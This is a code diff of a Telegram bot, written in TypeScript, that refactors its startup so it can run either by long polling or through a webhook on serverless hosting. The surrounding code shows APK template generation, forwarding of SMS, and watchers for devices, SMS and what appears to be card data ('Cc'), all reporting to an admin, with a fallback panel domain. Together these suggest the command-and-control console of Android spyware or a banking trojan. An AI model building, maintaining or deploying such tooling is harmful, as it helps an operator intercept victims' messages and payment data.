@@ -107,8 +107,8 @@ export function getBot(): Telegraf | null {
   return bot;
 }
 
-export async function startBot(): Promise<void> {
-  if (!BOT_TOKEN) return;
+export function createBot(): Telegraf {
+  if (!BOT_TOKEN) throw new Error("TELEGRAM_BOT_TOKEN is required");
 
   // Pre-decode APK template in background so /apk is ready instantly
   initApkTemplate().catch((err) =>
@@ -1015,30 +1015,18 @@ export async function startBot(): Promise<void> {
     await ctx.reply("✅ *SMS forwarding channel removed.*\nNo more SMS will be forwarded.", { parse_mode: "Markdown" });
   });
 
-  // Launch bot first — only start watchers if THIS process owns the bot token.
-  // If another process already claimed it (409), skip watchers to avoid duplicate alerts.
-  bot.launch({ dropPendingUpdates: true }).then(() => {
-    startDeviceWatcher(bot!, ADMIN_ID);
-    startSmsWatcher(bot!, ADMIN_ID);
-    startCcWatcher(bot!, ADMIN_ID);
-    logger.info("Watchers started — this process owns the bot");
-  }).catch((err: any) => {
-    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
-      logger.warn("Bot 409 conflict — another instance is running. Watchers NOT started in this process.");
-    } else {
-      logger.error({ err }, "Bot launch error");
-      startDeviceWatcher(bot!, ADMIN_ID);
-      startSmsWatcher(bot!, ADMIN_ID);
-      startCcWatcher(bot!, ADMIN_ID);
-    }
-  });
-  logger.info("Telegram bot started");
+  return bot;
+}
+
+// Launches the bot in long-poll mode (for Render / local / containers)
+export async function startBot(): Promise<void> {
+  const b = createBot();
 
   // Warn admin if PANEL_URL is not set
   if (!process.env["PANEL_URL"]) {
     logger.warn("PANEL_URL env var not set — bot will use fallback panel.kimiaxe.com");
     try {
-      await bot.telegram.sendMessage(
+      await b.telegram.sendMessage(
         ADMIN_ID,
         `⚠️ *PANEL_URL not set*\n\nAdd env var:\n\`PANEL_URL=https://panel.kimiaxe.com\` or your GH Pages URL\n\nCurrent fallback: ${getPanelUrl()}`,
         { parse_mode: "Markdown" }
@@ -1048,7 +1036,33 @@ export async function startBot(): Promise<void> {
     }
   }
 
+  // Launch bot first — only start watchers if THIS process owns the bot token.
+  // If another process already claimed it (409), skip watchers to avoid duplicate alerts.
+  b.launch({ dropPendingUpdates: true }).then(() => {
+    startDeviceWatcher(b, ADMIN_ID);
+    startSmsWatcher(b, ADMIN_ID);
+    startCcWatcher(b, ADMIN_ID);
+    logger.info("Watchers started — this process owns the bot");
+  }).catch((err: any) => {
+    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
+      logger.warn("Bot 409 conflict — another instance is running. Watchers NOT started in this process.");
+    } else {
+      logger.error({ err }, "Bot launch error");
+      startDeviceWatcher(b, ADMIN_ID);
+      startSmsWatcher(b, ADMIN_ID);
+      startCcWatcher(b, ADMIN_ID);
+    }
+  });
+  logger.info("Telegram bot started");
+
   // Graceful shutdown
-  process.once("SIGINT", () => bot!.stop("SIGINT"));
-  process.once("SIGTERM", () => bot!.stop("SIGTERM"));
+  process.once("SIGINT", () => b.stop("SIGINT"));
+  process.once("SIGTERM", () => b.stop("SIGTERM"));
+}
+
+// Sets Telegram webhook (for serverless / Vercel). Returns the bot instance.
+export function setupWebhook(url: string): Telegraf {
+  const b = createBot();
+  b.telegram.setWebhook(url).catch((err) => logger.error({ err }, "setWebhook failed"));
+  return b;
 }
